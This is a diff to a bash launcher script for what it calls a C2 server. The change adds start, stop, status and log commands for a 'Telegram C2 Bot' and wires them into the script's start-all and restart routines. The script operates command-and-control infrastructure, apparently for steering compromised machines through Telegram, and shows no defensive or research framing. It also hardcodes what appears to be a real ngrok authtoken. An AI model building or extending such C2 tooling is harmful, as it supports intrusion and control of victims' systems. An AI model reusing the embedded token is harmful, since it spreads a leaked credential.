@@ -19,6 +19,8 @@ PORT="${PORT:-5000}"
 VENV="$SCRIPT_DIR/venv"
 PID_FILE="$SCRIPT_DIR/data/c2-server.pid"
 LOG_FILE="$SCRIPT_DIR/logs/c2-server.log"
+TG_PID_FILE="$SCRIPT_DIR/data/telegram-bot.pid"
+TG_LOG_FILE="$SCRIPT_DIR/logs/telegram-bot.log"
 NGROK_PID_FILE="$SCRIPT_DIR/data/ngrok.pid"
 NGROK_LOG_FILE="$SCRIPT_DIR/logs/ngrok.log"
 NGROK_AUTHTOKEN="3BSLfBkyp4PMXsaom9XTj5mcsDb_2YJmW96LrznsCNPWddTcP"
@@ -58,6 +60,58 @@ check_venv() {
             flask flask-socketio flask-bcrypt requests python-dotenv \
             psutil cryptography faker numpy pandas pillow \
             eventlet gunicorn pyyaml 2>/dev/null
+    fi
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# TELEGRAM C2 BOT
+# ─────────────────────────────────────────────────────────────────────────────
+
+telegram_start() {
+    if [ -f "$TG_PID_FILE" ] && kill -0 $(cat "$TG_PID_FILE") 2>/dev/null; then
+        echo -e "${YELLOW}Telegram bot already running (PID: $(cat $TG_PID_FILE))${NC}"
+        return 0
+    fi
+    
+    echo -e "${GREEN}Starting Telegram C2 Bot...${NC}"
+    
+    source "$VENV/bin/activate"
+    nohup "$VENV/bin/python" "$SCRIPT_DIR/src/telegram_bot.py" > "$TG_LOG_FILE" 2>&1 &
+    echo $! > "$TG_PID_FILE"
+    
+    sleep 1
+    
+    if [ -f "$TG_PID_FILE" ] && kill -0 $(cat "$TG_PID_FILE") 2>/dev/null; then
+        echo -e "${GREEN}✓ Telegram bot started (PID: $(cat $TG_PID_FILE))${NC}"
+    else
+        echo -e "${RED}✗ Failed to start Telegram bot${NC}"
+        tail -10 "$TG_LOG_FILE"
+    fi
+}
+
+telegram_stop() {
+    if [ -f "$TG_PID_FILE" ]; then
+        PID=$(cat "$TG_PID_FILE")
+        if kill -0 "$PID" 2>/dev/null; then
+            kill -TERM "$PID" 2>/dev/null || true
+            sleep 1
+            kill -0 "$PID" 2>/dev/null && kill -9 "$PID" 2>/dev/null || true
+        fi
+        rm -f "$TG_PID_FILE"
+    fi
+    
+    pkill -f "telegram_bot.py" 2>/dev/null || true
+    echo -e "${GREEN}✓ Telegram bot stopped${NC}"
+}
+
+telegram_status() {
+    echo -e "${CYAN}Telegram Bot Status:${NC}"
+    
+    if [ -f "$TG_PID_FILE" ] && kill -0 $(cat "$TG_PID_FILE") 2>/dev/null; then
+        echo -e "${GREEN}✓ Running (PID: $(cat $TG_PID_FILE))${NC}"
+    else
+        echo -e "${RED}✗ Not running${NC}"
+        [ -f "$TG_PID_FILE" ] && rm -f "$TG_PID_FILE"
     fi
 }
 
@@ -176,20 +230,23 @@ install_deps() {
 start_all() {
     show_banner
     server_stop
+    telegram_stop
     sleep 1
     server_start
+    telegram_start
     echo ""
     echo -e "${GREEN}╔══════════════════════════════════════════════════════╗${NC}"
-    echo -e "${GREEN}║  C2 SERVER RUNNING (Telegram C2 Direct API)          ║${NC}"
+    echo -e "${GREEN}║  C2 SERVER + TELEGRAM BOT RUNNING                     ║${NC}"
     echo -e "${GREEN}╚══════════════════════════════════════════════════════╝${NC}"
     echo ""
     echo -e "  Local:   ${CYAN}http://localhost:$PORT${NC}"
-    echo -e "  C2:      ${GREEN}Telegram API (no tunnel needed)${NC}"
+    echo -e "  C2:      ${GREEN}Telegram Bot Active${NC}"
 }
 
 stop_all() {
     show_banner
     server_stop
+    telegram_stop
     echo -e "${GREEN}✓ All stopped${NC}"
 }
 
@@ -316,9 +373,20 @@ case "${1:-}" in
     # Server
     start)      server_start ;;
     stop)       server_stop ;;
-    restart)    server_stop; sleep 1; server_start ;;
-    status)     server_status ;;
+    restart)    server_stop; sleep 1; server_start; telegram_start ;;
+    status)     server_status; telegram_status ;;
     logs)       server_logs "$2" ;;
+    
+    # Telegram
+    telegram)
+        case "${2:-}" in
+            start)      telegram_start ;;
+            stop)       telegram_stop ;;
+            status)     telegram_status ;;
+            logs)       tail -100 "$TG_LOG_FILE" ;;
+            *)          echo "Usage: $0 telegram {start|stop|status|logs}" ;;
+        esac
+        ;;
     
     # Tunnel
     tunnel)
